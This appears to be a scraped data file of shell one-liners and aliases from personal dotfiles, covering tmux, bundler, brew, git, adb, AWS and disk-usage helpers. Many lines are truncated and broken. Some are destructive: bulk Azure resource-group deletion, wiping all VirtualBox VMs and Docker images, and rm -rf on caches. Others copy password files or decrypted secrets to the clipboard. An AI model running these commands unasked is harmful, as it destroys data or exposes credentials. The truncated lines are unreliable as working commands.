cat *.mkd | markdown | xclip; xclip -o >
cat *.c *.h | uniq | wc -l
cat ${pass_dir}/${f} | tr -d '\n' | pbcopy
cat ${ZSH_ROOT}/zshrc.sh | grep ^alias | sort
cat ${HOME}/.ssh/id_rsa.pub | xclip -selection clipboard | echo '=> Public key copied to pasteboard.'
cat ${HOME}/.history_log.${HOSTNAME} | awk -F ' ~~~ ' '{print \$2}' | uniq
cat ${DOTFILES_PATH}/zsh/snippets.zsh | sed -r 's/^function //g' | sed -r 's/^# (.*)/\x1b[32m\x1b[1m# \1\x1b[0m/'
cat $bashrcpath | grep alias | cut -c 7-
cat $SECURITY_DIR/swegkdb.pass | tr -d '\\n' | pbcopy
cat $REPO/kdg/TODO.md | grep -v x | head -n 20
cat $HOSTS_FILE | grep -i $name | cut -d' ' -f1
cat $HOME/toolbox/mysql/aliases/csh|grep -v '##--'|cut -d ' ' -f 1-2
cat $HOME/pp.txt.gpg | gpg | xsel -ib
cat $HOME/dev/scratchpad/allhosts | grep -Ev '^#|^$'
cat $HOME/.vimrc | rg 'autocmd FileType tex inoremap.*' | cut -d';' -f2
cat $HOME/.tailer.rc | peco | bash -
cat $HOME/.ssh/personal.pub | pbcopy | echo '=> Public key copied to pasteboard.'
cat $HOME/.ssh/id_rsa.pub | pbcopy | echo '=> Public key copied to pasteboard.'
cat $HOME/.ssh/config | grep 'Host ' | cut -d ' ' -f2
cat $HOME/.bash_log | awk -F ' ~~~ ' '{print \$2}' | uniq
cat $HOME/.bash_history | fzf --tac --sync --tiebreak=index | pbcopy
cat $HISTFILE | tail -n 2 | cb
cat $HISTFILE | tail -n 1 | copy
cat $HISTFILE | tail -n 1 | cb
cat $HISTFILE | sort -u | rff
cat $1 | fmt -w 95 | pbcopy
cat $1 | ccze -A|less -r
cargo doc | /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --kiosk ./target/doc/*/index.html | cd ../../ && echo 'Generated documentation and started the doc-browser'
caller.select { |x| x.include?('/tc-www/app') }
caller.select { |file| file.include?('tc-www/app') }
cal | grep -E --color '\b`date +%e`\b|$'
cal | grep --color -EC6 '\b$(date +%e | sed 's/ //g')'
cal 2019 |head -n 18 | tail -n 8
cal -m > /dev/null 2>&1 && cal -m || ncal -M
cal $1 | grep --color -EC6 '\b$(date +%e | sed 's/ //g')'
cabal-installed-pkgs | xargs cabal info | cabal-license
c-all df -h | grep -E 'cassandra|Filesystem'
bzr log -p | colordiff | more
bzr diff | colordiff | less -R
bv_stop_zaynar || bv_start_zaynar
bv_stop_cms || bv_start_cms
bv_restart_cms || bv_restart_zaynar
bundle install --local || bundle install
bundle exec rubocop $(git status | egrep modified.*rb | sed s/modified://)
bundle exec rspec \`git status --untracked-files --porcelain | grep '_spec.rb$' | cut -b 4-\`
bundle exec rake db:drop db:create db:migrate RAILS_ENV=test || echo
bundle exec rake db:drop db:create db:migrate && bundle exec rake db:seed || echo
bundle exec rails s -p 3001 | grep -v metriks | grep -v COUNT
bundle exec pod install || bundle exec pod install --repo-update
bundle check || bundle install -j4
bundle check || bundle install --path vendor/bundle --jobs 4
bundle check || bundle install --path vendor/bundle
bundle check || bundle install --local
bundle check || bundle install --jobs=4
bundle check || bundle install --jobs 4
bundle check || bundle install
bundle check || bundle
bundle check > /dev/null || bundle install --path=vendor/bundle --jobs=4 > /dev/null
bundle check 2>/dev/null || bundle install
bundle check 2>/dev/null || bundle config --local frozen false && bundle install && bundle config --local frozen true
bundle check --path=.bundle || bundle install --path=.bundle --binstubs .bundle/bin --jobs=4 --retry=3; rbenv rehash
bundle check --path=.bundle || bundle install --path=.bundle --binstubs .bundle/bin --jobs=4 --retry=3
bundle --local || bundle
bshares -q PD | grep $LSB_DEFAULTPROJECT | sort -n -k 3 -r
browserify . --standalone test | uglifyjs | wc -c
brew update;brew upgrade;brew cask outdated | cut -d\ -f1 | xargs brew cask reinstall
brew update && brew upgrade && brew cask outdated|cut -f 1 -d ' '|xargs brew cask reinstall
brew update && brew outdated | awk '{print $1}' | xargs brew upgrade
brew up && brew outdated | awk '{ print $1 }' | xargs brew upgrade
brew unlink php56 | brew unlink php70 | brew link php55
brew unlink php55 | brew unlink php70 | brew link php56
brew unlink php55 | brew unlink php56 | brew link php70
brew search | peco | xargs brew install
brew outdated | ipt -m -M 'Select Packages to Upgrade:' | xargs brew upgrade
brew outdated | cut -f1 | xargs brew upgrade
brew outdated | cut -d ' ' -f 1 | xargs brew fetch
brew list|tr -s ' ' '\n'| while read line; do brew info $line; done
brew list | while read cask; do echo -n $fg[blue] $cask $fg[white]; brew deps $cask | awk
brew leaves | xargs brew deps --installed --for-each | sed \
brew graph | dot -Tpng >| /tmp/deps.png && open /tmp/deps.png
brew cask search | peco | xargs brew cask install
brew cask search | peco | xargs brew cask info
brew cask outdated | sed $1 | xargs brew cask install --force
brew cask outdated | ipt -m -M 'Select Packages to Upgrade:' | xargs brew cask upgrade
brew cask outdated | cut -d ' ' -f 1 | xargs brew cask reinstall; brew upgrade
brew cask outdated | awk '{print $1}' | xargs brew cask install --force
branch_files | grep '\.rb$' | xargs rubocop
bqueues | head -1; bqueues | grep moore
bootstrap=`docker ps | grep bootstrap | awk '{print $1}'`; echo bootstrap = $bootstrap
bkr $HOME/.local/scripts/opc || $HOME/.local/scripts/opc
bjobs | grep -v interactive | awk
bjobs -u $USER | grep RUN | wc
bitcoin-cli getmininginfo | egrep ""\""blocks\""|\""errors\"""""
bitbake modambarella-s3l -c print_checksums | grep MD5SUM | awk
bin/tt $(git status --porcelain | grep test/ | awk \{print\ \$2\})
bin/rails c || bundle exec rails c
bfd -a | grep sshd | cut -d' ' -f1
best_rake db:migrate || best_rake db:migrate
beep || beep
bee -h | grep '^ ' | sed 's/^..//;s/[ /].*//'
be spec $(git status --porcelain | grep _spec.rb | awk \{print\ \$2\})
bat --theme=\$(defaults read -globalDomain AppleInterfaceStyle &> /dev/null && echo default || echo GitHub)
bash -c 'while IFS='' read -r line || [[ -n \
base64| tr '+' '-'| tr '/' '_'
base64 </dev/urandom | tr -dc a-zA-Z0-9 | head -c
base64 < /dev/random | tr -dc _a-z-0-9 | head -c24
base64 -d <(curl https://xxoox.fun/subLove.php | base64 -d - | sed 's/vmess:\/\///')
base64 -D | gzip -d | xmlformat -
base64 --decode | aws kms decrypt --ciphertext-blob fileb:///dev/stdin --output text --query Plaintext | base64 --decode
az vm list-skus --output table|grep -v NotAvailable|grep Standard_B
az group delete -n $(az group list -o table | grep -i rg | awk '{print $1}') --no-wait --yes
aws eks get-token --cluster-name roc-test2 | jq -r .status.token | pbcopy
aws ecr get-login --no-include-email --region us-west-2|cut -d ' ' -f 6| docker login -u AWS --password-stdin https://324842975178.dkr.ecr.us-west-2.amazonaws.com
aws ecr describe-repositories | jq '.repositories[] | {
aws ec2 describe-volumes | jq '.Volumes[] | select(has(\
aws ec2 describe-instances | json Reservations | json -a Instances[0].PublicIpAddress
aws ec2 describe-instances | jq -r '.Reservations[].Instances[] | \
aws ec2 describe-instances | jq -C . | less -SRi
aws ec2 describe-instances | jq '.Reservations[].Instances[] | .InstanceId + \
aws cloudformation describe-stacks | jq '.Stacks[] | .StackName + \
awk -F':' '/^[a-zA-Z0-9][^$#\/\t=]*:([^=]|$)/ {print \$1}' Makefile | sort
awk -F ':' '{print $1}' | sort | uniq
awk '{print \$2}' | awk '/^[0-9]+\$/' | xargs kill -9
awk '{print $1}' < ~/.android/adbkey.pub | openssl base64 -A -d -a | openssl md5 -c
awk '{if (a[$0] < NR || a[$0] == 0){a[$0]=NR}}END{for (i in a){print a[i]
awk '{ if (\$1 ~ /^@/ || \$1 ~ /^\s*$/) { print \$0; } else { exit; } }'
awk '{ if (\$1 ~ /^#/ || \$1 ~ /^\s*$/) { print \$0; } else { exit; } }'
awk 'NR % 4 == 1' list.txt > clist.txt && sort clist.txt | uniq -c | sort -nr > dupes.txt
awk 'FNR>1 || NR==1'
awk 'BEGIN {i = 0} {if(!(\$1 ~ /^@/ || \$1 ==
awk 'BEGIN {i = 0} {if(!(\$1 ~ /^#/ || \$1 ==
avahi-browse -r _naoqi._tcp | grep RobotMaterialization=Real -B 2 -m 10 | grep address
autoenv list -f | grep test | awk
auracle sync | cut -d' ' -f1 | xargs auracle download
atom $(ls ~/Develop/projects | peco | xargs -I % echo ~/Develop/projects/%)
at_lanl && proxy_on || proxy_off
aspell -l ru dump master|aspell -l ru expand |less
arp -a | grep 'b8:27:eb' | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+'
aptp $(sudo dpkg --get-selections | grep 'deinstall' | cut -f1)
aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`
apt-get update 2>&1 | awk '/NO_PUBKEY/{print \$NF}' | xargs apt-key adv --keyserver keyserver.ubuntu.com --recv-keys
apt-get update 2>&1 | awk '/NO_PUBKEY/{print $NF}' | xargs apt-key adv --keyserver keyserver.ubuntu.com --recv-keys
apt-get autoremove;apt-get autoclean;find /var/cache/apt/archives/ -type f | grep deb | xargs rm -rvf
apt-get -s dist-upgrade | awk '/^Inst/ { print $2 }' | wc -l``
apt list | grep -v installed | grep -v dev
app shell_plus || app shell
app runserver_plus || app runserver
aplaymidi -p`aplaymidi -l|tail -n1|awk {print\$1}`
apache2ctl -S | grep namevhost | awk -F \
aosc_lib_skip $BASH_SOURCE || return 0
aosc__sourceskip $BASH_SOURCE || return 0
ansiweather | tr '-' '\n' |tr '\>' '\n'
ansiweather -l Bangkok -F | tr '-' '\n' |tr '\>' '\n'
amixer get Master | grep --color=never -o -e '\[.*%\] \[o.*\]' | head -1
amixer get Master | awk '/Mono:/ { print \$3 - 2 }' | xargs amixer set Master
amixer get Master | awk '/Mono:/ { print \$3 + 2 }' | xargs amixer set Master
amixer -c DGX sset 'Analog Output' 'Stereo Headphones FP' 2>/dev/null || true
amixer -c DGX sset 'Analog Output' 'Multichannel' 2>/dev/null || true
amixer -- | sed -n 5p | cut -d
alias|grep vagrant|grep -v grep
alias|cut -d'=' -f1 ; declare -f|grep \(
alias | tr '=' ' ' | awk '{ print \$2; }'
alias | sort | grep -i
alias | sort --random-sort | head -n 1
alias | sed -e 's/=/ = /' | less
alias | sed 's/alias //g' | sed 's/=/ = /g'
alias | sed 's/=/\t/' | sed -r 's/'
alias | perl -MList::Util=shuffle -e 'print shuffle(<stdin>);' |head -n 1
alias | grep hg | egrep -v \
alias | grep git | sort
alias | grep git | peco
alias | grep git | less && git al
alias | grep git | less
alias | grep git | grep
alias | grep git | egrep -v \
alias | grep cd | grep -v [.]
alias | grep -v grep | grep \'git --color=never && aliasFNGit
alias | grep -i $GK_ACTIVE_PROJECT| grep -i cd
alias | grep -e 'alias g[0-9]' | grep -v 'alias m' > $shellbm_file
alias | grep -e 'alias g[0-9]' | grep -v 'alias m' > $SHELLBM_FILE
alias | grep --color=always git | grep --color=always -v galias
alias | cut -d' ' -f2- | awk -F'=' '{printf \
alias | cut -c7- | bat -l ini --style=plain --paging never
alias | cut -c7- | bat -l ini --style=plain
alias | ag ^b: | sort
alias -p | cut -d= -f1 | cut -d' ' -f2
alias -L | sed 's/^/\n/g' | bat -l sh
alder --depth 2 --exclude='.git|bower_components|node_modules' -sa
ag -l | peco | xargs -o vim
ag -l yml ~/.tmuxinator/ | sed 's=.*/==' | cut -f 1 -d '.'
ag -il 'first' | xargs ag -il 'second' | xargs ag -il 'third'
ag --nobreak --nonumbers --noheading . | fzf | fpp
ag '>>>>>>>|<<<<<<<|======='
ag '(TODO|XXX|FIXME)'
ag '( \t|\t )' *.(c|h)
addr=$( dig +short myip.opendns.com @resolver1.opendns.com | grep.ip ) ; echo remote:${addr:-$( wget -q -O- icanhazip.com | grep.ip )}
adb shell ps | grep monkey | awk
adb shell pm list package | sed -e s/package:// | peco
adb shell pm clear com.tencent.wecarmusic ; adb shell ls -R /storage/extsd/tencent/wecarmusic/data ; adb shell kill -9 `adb shell ps | grep music | cut -c10-15`;adb shell rm -r /storage/extsd/tencent/wecarmusic/data ; adb shell ls /storage/extsd/tencent/wecarmusic/data
adb shell monkey -p `aapt dump badging ./app/build/outputs/apk/debug/app-debug.apk | grep -e 'package: name' | cut -d \' -f 2` 1
adb shell kill -9 `adb shell ps | command grep music | cut -c10-15`
adb shell kill $(adb shell ps | peco | tr -s
adb shell dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'
adb shell dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'
adb shell dumpsys window w | grep \/ | grep name=
adb shell dumpsys activity activities | grep apk | less
adb shell cat /proc/cpuinfo | grep processor | wc -l
adb shell 'pm list packages -f' | sed -e 's/.*=//' | sort
adb logcat | grep HttpInv | tee
adb logcat -c | adb logcat -v time | grep -v D/SNFCCCS
adb devices | tail -n +2 | cut -sf 1
adb -s ${TARGET} shell 'pm list packages -f' | sed -e 's/.*=//' | sort
adb -d shell 'su -c kill \`ps | grep $1 | awk \'{ print \$2 }\'\`'
adb -d shell 'pm list packages -f' | sed -e 's/.*=//' | sort
acpitool -B|head -n 2|tail -n 1
acpi |tr -cs '0-9%' '\n'|grep %
acpi | cowsay | lolcat
acpi -b | head -n1 | awk '{print \$4-0}';
ack -f | ctags -L - && ack -f >| cscope.files && cscope -b -q
ack -f --type=python . | ctags -L - -f .tags; ack -f --type=python $VIRTUAL_ENV | ctags -L - -f .tags_env
ack '\.(gradle|properties|xml)'
accurev stat -x | grep -v git | grep -v logs
`which kubectl` config view | grep 'server:' | sed -E -e 's/(.*)\/\/(.*)\.(.*)\.(.*)\.(.*)\.(.*)$/'
`whence colordiff || echo
`type -P stringsext || type -P strings`
`type -P less || type -P more`
`todoist list | fzf -m | awk
`mktemp -d 2>/dev/null || mktemp -d -t 'mytmpdir'`
`ls | fzf | awk
`ls /usr/share/vim/vim80/macros/less.sh | sort -n | tail -1`
`locate macros/less.sh | egrep \^/usr.\*vim | head -1` # This can be in a lot of places # warning: this line is SLOW
`kubectl get pods | peco | awk
`kubectl config view -o json | jq -r .clusters[].name | peco`
`ifconfig en0 | awk '/inet /{print $2}' | cut -f2 -d':'`
`history | fzf | awk
`history 2 | head -n1 | sed 's/ *[0-9]* *//'`
`git status -s | peco | awk
`git status --porcelain | peco | awk
`git log --oneline | peco |cut -c 1-7`
`git checkout master && git branch --merged | grep -v '*' | xargs -I % git branch -d %`
`git branch | peco | cut -b 3-`
`gcloud projects list | peco | awk
`aws production | peco | cut -f2`
`aws perform | peco | cut -f2`
`[[ $colorsvn == true ]] && echo colorsvn || echo svn` --config-option servers:global:http-proxy-host='${proxy[3]}' --config-option servers:global:http-proxy-port='${proxy[4]}' $noproxy
`[ -e .zeus.sock ] && echo zeus || echo bundle exec`
`[ -e .zeus.sock ] && echo zeus || echo SAD: Zeus is not running 1>&2`
_sf; ls -F | grep -q \/$ && _sd; echo $(echo $(du -s .)|cut -d \ -f 1) $(du -sh .)
_jira | tr -d '\n' | pbcopy && _jira
_adbkill(){ adb shell kill `adb shell ps | grep $1 | awk {
__mylocation | grep -E 'LAT|LON'
__git_root ; git init ; test -r LICENSE || mit > LICENSE ; create-editorconfig ; create-readme ; g
__folder() { local p=$(pwd); nautilus ${p} >/dev/null 2>&1 || thunar ${p} >/dev/null 2>&1; unset -f __folder; }; __folder
_(){ tree -shfC $* | prettyprint.awk | less -r; }; _
_(){ lsh $@| grep -v ^d | grep -v ~$; }; _
_(){ find $@ -exec ls -alh {} \;| column -t | sort -k9}; _
_(){ echo | openssl s_client -showcerts -servername $1 -connect $1:443 2>/dev/null | openssl x509 -inform pem -noout -text; }; _
_(){ ([[ $# -eq 0 ]] && ping google.com) || ping $1 }; _
_ du -a . | sort -n -r | head -n 10
\xprop _KDE_NET_WM_ACTIVITIES WM_WINDOW_ROLE _KDE_NET_WM_DESKTOP_FILE WM_NAME _NET_WM_NAME _NET_WM_WINDOW_TYPE WM_CLIENT_MACHINE WM_CLASS | grep -v 'not found.$' | column -t
\users | tr ' ' '\n' | uniq
\sudo -H $(which pip3) install youtube-dl || \sudo -H $(which pip) install youtube-dl
\sudo -H $(which pip3) install -U youtube-dl || \sudo -H $(which pip) install -U youtube-dl
\sudo -H $(which pip3) install -U pip || \sudo -H $(which pip) install -U pip
\sudo -H $(which pip2) install -U pip || \sudo -H $(which pip) install U pip
\route -n | awk '/^(0.0.0.0|default)/{print\$2}'
\qstat|\grep jbylund|awk
\ps ux | \grep -v grep | \grep --color=auto emacs
\ps aux| grep -v grep | grep
\ps aux | grep -v grep | grep -i -e VSZ -e
\ps aux | grep -v grep | grep --color
\ps aux | \grep -v grep | \grep --color=auto
\ps aux --sort -rss | \head -1; \ps aux | \grep -v \grep
\ps -auxf | sort -nr -k 4 | head -10
\ps -C thunderbird >/dev/null || rm ~/.thunderbird/default/lock
\pgrep conky && \killall -SIGHUP conky || conky -d
\pgrep conky && \killall -SIGHUP conky || ( sleep 1; conky -d )
\pgrep -lfu $USER ssh-agent || eval $(ssh-agent -s)
\nmcli dev list | awk -F ':| *' '/DNS/{print\$NF}'
\mount | \column -t | pager
\lspci -nns \$(\lspci | awk '/Display|VGA/{print\$1}')
\ls -F node_modules | sed -n 's/@$//p' | xargs npm ls -g --depth 0
\less \`\ls -t1 /usr/local/cpanel/logs/cpbackup | \grep -v \/| \head -n 1\`
\godoc $(ghq list -p | peco) | $PAGER
\git ls-files -d | grep . && \git ls-files -d | \xargs git checkout-index
\find . -xdev -type f -size +10M -exec ls -lh {} \; 2>/dev/null | sort -nrk5 | head -n
\find . -xdev -type f -size +10M -exec ls -lh {} \; 2>/dev/null | sort -nrk5 | head -5
\find . -xdev -type f -size +10M -exec ls -lh {} \; 2>/dev/null | sort -nrk5 | head -10
\egrep -iC2 'error|erreur|java.*exception'
\du -xsm */ .??*/ | sort -nr | head -n
\du -xsm */ .??*/ | sort -nr | head -5
\du -xsm */ .??*/ | sort -nr | head -10
\du -xsm */ .??*/ | sort -n | tail -n
\du -xsm */ .??*/ | sort -n | tail -5
\du -xsm */ .??*/ | sort -n | tail -10
\du -xsm */ .??*/ 2>/dev/null | sort -nr | head -n
\du -xsm */ .??*/ 2>/dev/null | sort -nr | head -5
\du -xsm */ .??*/ 2>/dev/null | sort -nr | head -10
\du -xsm */ .??*/ 2>/dev/null | sort -n | tail -n
\du -xsm */ .??*/ 2>/dev/null | sort -n | tail -5
\du -xsm */ .??*/ 2>/dev/null | sort -n | tail -10
\du -xmd 1 2>/dev/null | sort -nr | head -n
\du -xmd 1 2>/dev/null | sort -nr | head -5
\du -xmd 1 2>/dev/null | sort -nr | head -$(($LINES-2))
\du -xmd 1 2>/dev/null | sort -nr | head
\du -xhd 1 2>/dev/null | sort -hr | head -n
\du -sh $(ls -d .*|grep -v ^.$|grep -v ^..$)
\du -chs *|sort -hr|head -11
\du --max-depth=1 | sort -nr | head -n 20
\du err.txt generated.file succ.txt -cs | sort -nr | head
\cat /dev/urandom | hexdump -C | grep \
\`git branch | peco | sed -e \
\\tmux -L hubert attach || \\tmux -L hubert
\\ls -a | grep 'zcompdump' | xargs -n 1 rm -rf
\\ls -a | grep '_orig$' | xargs -n 1 rm -rf
\'`history 2 | head -n 1 | cut -c 8-`\' >> ~/.bash_aliases; rb
\${EDITOR} ~/.zshrc -c ':args ~/.zsh/* | argdo tabe | tabdo syntax on'
\$(ls -p | grep -v / | fzf --preview='head ~/.flashcard' -e --bind 'enter:toggle-preview' --bind 'space:execute(head {} > ~/.flashcard)+up' --height=16 --preview-window=down:10 --border --margin 1)
\$(fd --hidden -t f -E .git/ | fzf | awk -v pwd=\$(pwd) '{print pwd \
[[ 0 -eq $(($RANDOM % 2)) ]] && echo 'tailz' || echo 'headz'
[[ -v CSENABLED ]] && { echo 'CSENABLED TRUE'; } || { echo 'CSENABLED FALSE'; }
[[ -o xtrace ]] && set +x || set -x
[[ -f ~/Dropbox/simplenote/todo.txt ]] && t $* ; [[ -f ~/Dropbox/simplenote/todo.txt ]] || ssh hurricane t $*
[[ -f ~/.bash_profile ]] && vim ~/.bash_profile || vim ~/.profile
[[ -f ~/.bash_profile ]] && code ~/.bash_profile || code ~/.profile
[[ -f tests/phpunit.xml && ! -f phpunit.xml ]] && phpunit -c tests/phpunit.xml || phpunit
[[ -f tests/phpunit.local.xml ]] && ./vendor/bin/phpunit -c tests/phpunit.local.xml || ./vendor/bin/phpunit
[[ -f app/console ]] && app/console || bin/console
[[ -e ~/.local/apps/vim/src/vim ]] && ~/.local/apps/vim/src/vim || /usr/bin/vim
[[ -e bin/phpunit ]] && bin/phpunit -c vendor/typo3/testing-framework/Resources/Core/Build/UnitTests.xml || vendor/bin/phpunit -c vendor/typo3/testing-framework/Resources/Core/Build/UnitTests.xml
[[ -e /usr/bin/nvim ]] && /usr/bin/nvim || /usr/bin/vim
[[ -e .zeus.sock ]] && zeus rake || bundle exec rake
[[ -e .zeus.sock ]] && zeus rake routes || bundle exec rake routes
[[ -e $f ]] || continue
[[ -d ~/.matt-config/.git ]] && echo Managed by Git || rsync -av --delete --exclude .git blissett.me.uk:.matt-config/ ~/.matt-config/
[[ -d /tmp/emacs$(id -u) ]] || mkdir /tmp/emacs$(id -u)
[[ $ZSH_THEME = random ]] || settheme random; source ~/.zshrc
[[ $TERM = *screen* ]] || ssh goodi@goodi.gotdns.com
[[ $PWD =~ $HOME/.dotfiles ]] && hub --git-dir=$HOME/.dotfiles --work-tree=$HOME || hub
[[ $PROMPT_BARE ]] && unset PROMPT_BARE || PROMPT_BARE=1
[[ $AX_BLUR == ON ]] && bluroff || bluron; clear; true
[[ $? == 0 ]] ||
[[ $? -eq 0 ]] || fail
[[ $? -eq 0 ]] && echo yes || echo no
[[ $- == generated.file ]] && echo 'True' || echo 'False'
[[ $(tmux list-sessions) ]] && tmux attach || tmux
[[ $(pwd) = ${HOME}/.dotfiles/* ]] && ls -a --color || ls --color
[[ $(git rev-parse --abbrev-ref HEAD) == master ]] && git branch --no-merged | grep review- | xargs -p git branch -D
[[ ! -z `git rev-parse --show-cdup` ]] && cd `git rev-parse --show-cdup` || pwd
[[ ! -z '$(declare -F | grep deactivate)' ]] && deactivate;cd $CATTLE_ROOT/tests/integration;rm -rf .tox ;[[ ! -z '$(declare -F | grep activateVenv)' ]] && activateVenv && echo hello;tox
[ _amionline ] && echo yes || echo no
[ __get_is_inside_repo() ] && git status || status
[ \$[ \$RANDOM % 6 ] == 0 ] && echo Boom || echo Click
[ \$LUX_DEVELOPER -eq 0 ] && export LUX_DEVELOPER=1 || export LUX_DEVELOPER=0; lux rrc --quiet; echo \$LUX_DEVELOPER
[ 1 == $(uname -a|grep -i $x|wc -l) ] &&
[ 1 != $(uname -a|grep -i $x|wc -l) ] &&
[ -x bin/console ] && bin/console || bin/rails console
[ -x ./develop.sh ] && ./develop.sh || navy develop
[ -f ~/dev/manageiq/vmdb/Gemfile ] && cd ~/dev/manageiq/vmdb || cd ~/dev/manageiq
[ -f ~/.zshrc ] && vim ~/.zshrc || vim ~/.bashrc
[ -f ~/.zshrc ] && source ~/.zshrc || source ~/.bashrc
[ -f settings-development.json ] && meteor run --settings settings-development.json || meteor run
[ -f script/server ] && script/server || rails server
[ -f script/dbconsole ] && script/console --include-password || bundle exec rails dbconsole --include-password
[ -f script/console ] && script/console || bundle exec rails console
[ -f script/console ] && script/console --sandbox || bundle exec rails console --sandbox
[ -f mix.exs ] && mix phx.server || bundle exec rails s
[ -f mix.exs ] && mix ecto.rollback || rake db:rollback
[ -f mix.exs ] && mix ecto.migrate || rake db:migrate
[ -f mix.exs ] && iex -S mix || bundle exec rails c
[ -f /var/run/reboot-required ] && echo yes || echo no
[ -f /tmp/savepath ] && \`cat /tmp/savepath\` || echo /tmp/savepath does not exist.
[ -f ./git-sync.sh ] && chmod +x ./git-sync.sh && ./git-sync.sh || [ -f ./.git-sync.sh ] && chmod +x ./.git-sync.sh && ./.git-sync.sh
[ -f ./Session.vim ] && nvim -S || nvim
[ -e pizza.$(date +%Y-%m-%d) ] || echo pizza bestellung fuer pizza am $(date +%Y-%m-%d) >> pizza.$(date +%Y-%m-%d) && vim pizza.$(date +%Y-%m-%d)
[ -e Procfile.local ] && nf start --procfile Procfile.local || nf start
[ -e /tmp/emacs$UID/mail ] || emacs --daemon=mail
[ -e /tmp/emacs$UID/default ] || emacs --daemon=default
[ -e ./venv/bin/activate ] && source ./venv/bin/activate || source ${HOME}/venv/bin/activate
[ -e ${HOME}/.npmrc_bak ] && mv ${HOME}/.npmrc_bak ${HOME}/.npmrc || echo 'Already active.'
[ -e ${HOME}/.npmrc ] && mv ${HOME}/.npmrc ${HOME}/.npmrc_bak || echo 'Already deactivated.'
[ -e $HOME/go/src/github.com/youtube/vitess ] && cd $HOME/go/src/github.com/youtube/vitess || echo
[ -e $HOME/.bash_profile ] && source $HOME/.bash_profile || source $HOME/.bashrc
[ -d ~/.composer ] || mkdir ~/.composer; docker run --rm --interactive --tty --user 1000:33 -v `pwd`:/app -v ~/.composer:/tmp/.composer -e COMPOSER_HOME=/tmp/.composer composer --ignore-platform-reqs
[ -d vp ] || virtualenv -p python3.6 vp && source vp/bin/activate
[ -d /sys/firmware/efi ] && echo UEFI || echo BIOS
[ -d .git ] || git rev-parse --git-dir > /dev/null 2>&1
[ -d .git ] && ctags -R -f ./.git/tags . || ctags -R .
[ -d $HOME/luggage ] && pushd $HOME/luggage/ || pushd /var/luggage && git pull && git submodule update --init && . $HOME/.bash_profile && popd
[ -d $HOME/go/vtdataroot ] && cd $HOME/go/vtdataroot || echo
[ $return_value == 0 ] || exit 1
[ $return_value == 0 ] || break
[ $[ $RANDOM % 6 ] == 0 ] && echo Die || echo Live
[ $RANGER_LEVEL ] && exit || ranger
[ $? == 0 ] ||
[ $(tput colors 2>/dev/null || echo 0) -ge 16 ] && [ -t 1 ]
[ $(pidof weechat-curses) ] && tmux attach -t Chat || tmux new -s Chat weechat-curses
[ $(pidof rtorrent) ] && tmux attach -t Torrent || tmux new -s Torrent rtorrent
[ $(pidof pianobar) ] && tmux attach -t Pandora || tmux new -s Pandora pianobar
[ $(docker ps -a -q | wc -l) -ne 0 ] && docker rm $(docker ps -a -q); [ $(docker images -q | wc -l) -ne 0 ] && docker rmi $(docker images -q); docker volume prune -f
[ $# -gt 0 ] || return -1
[ $# -ge 1 ] && rm `my_select $@` || rm `my_select *`
[ ! -z `git rev-parse --show-toplevel` ] && cd `git rev-parse --show-toplevel || pwd`
[ ! -z `git rev-parse --show-toplevel` ] && cd `g rev-parse --show-toplevel || pwd`
[ ! -z `git rev-parse --show-cdup` ] && cd `git rev-parse --show-cdup || pwd`
[ ! -z $(git rev-parse --show-toplevel) ] && cd $(git rev-parse --show-toplevel || pwd)
[ ! -z $(git rev-parse --show-cdup) ] && cd $(git rev-parse --show-cdup || pwd)
[ ! -e configure ] && ( ./autogen.sh && ./configure ) || ./configure
VERSION)..master | grep -Eo ""[A-Z]{2,8}-[1-9][0-9]{1,3}"" | sort -u);
VBoxManage list vms | cut -f 1 -d ' ' | xargs -I NAME sh -c 'VBoxManage controlvm NAME poweroff ; VBoxManage unregistervm NAME' ; rm -rf ~/VirtualBox\ VMs/*
VBoxManage list runningvms | sed -r 's/.*\{(.*)\}/\1/' | xargs -L1 -I {} VBoxManage controlvm {} savestate
VBoxManage list runningvms | sed -E 's/.*\{(.*)\}/\1/' | xargs -L1 -I {} VBoxManage controlvm {} savestate
VAR=`date +%Y%m%d`|touch $VAR.md|mou $VAR.md
VAGRANT_CWD=$(ls -d vagrant 2>/dev/null || echo
TODAY=`date '+%Y-%m-%d'` && top -l 28800 -ocpu -R -F -s 1 | grep 'CPU usage' --line-buffered | tee -a '~/CPU Usage/raw_data/$TODAY.txt'
TERM=xterm-256color;tmux -2 new-session -t default || tmux -2 new -s default
TERM=xterm-256color;tmux -2 attach -t default || tmux -2 new -s default
TERM=xterm-256color tmux attach || tmux new
TERM=xterm-256color tmux attach || TERM=xterm-256color tmux new
TERM=xterm-256color tmux -2 attach || TERM=xterm-256color tmux -2 new
TERM=xterm-256color tmux -2 attach || TERM=xterm-256color tmux -2 -f${${(%):-%x}:a:h}/tmux.conf new
TERM=xterm-256color tmux -2 -u attach || TERM=xterm-256color tmux -2 -u new
TERM=xterm-256color screen -x || screen
TERM=screen-256color-bce tmux attach || TERM=screen-256color-bce tmux new
TERM=screen-256color-bce tmux attach || TERM=screen-256color-bce tmux
TERM=screen-256color-bce tmux attach -t base || tmux new -s base
TERM=screen-256color-bce tmux -u attach || tmux -u new
TERM=screen-256color-bce tmux -2 attach || TERM=screen-256color-bce tmux new -s
TERM=screen-256color tmux attach||TERM=screen-256color tmux
TERM=screen-256color tmux attach -t default || tmux new -s default
TERM=screen-256color tmux attach -t 1 || tmux new -s 1
TERM=screen-256color tmux attach -t 0 || tmux new -s 0
TERM=screen-256color tmux -2 attach || tmux -2 new
TERM=kterm command screen -r ||TERM=kterm command screen -AU
TCLLIBPATH=/usr/lib/tcltk/x86_64-linux-gnu unbuffer nice make -j$(nproc) 2>&1 | tee /tmp/last_build.tmp | more && sed -i 's/\x1b\[[0-9;]*m//g;s/\x1b\[K//g' /tmp/last_build.tmp
RUNNING=1; __sigc() { RUNNING=0; }; trap __sigc SIGINT; setterm -cursor off; while (( RUNNING == 1 )); do echo -ne '\x1B[2K'; cpupower frequency-info | grep 'momentane Taktfrequenz' | sed 's/^[ a-zA-Z]*//g'; echo -ne '\x1B[F'; sleep 1; done; setterm -cursor on
Q=''; drush sqlq 'SHOW TABLES' | grep cache | { while read table; do Q=$Q\
PATH=$PATH:/usr/local/tools/Xilinx/Vivado/2018.3/bin && syn=/tmp/$USER/ds/syn && mkdir -p $syn && cd $syn && echo Vivado initialized and syn folder created || Initialization failed...
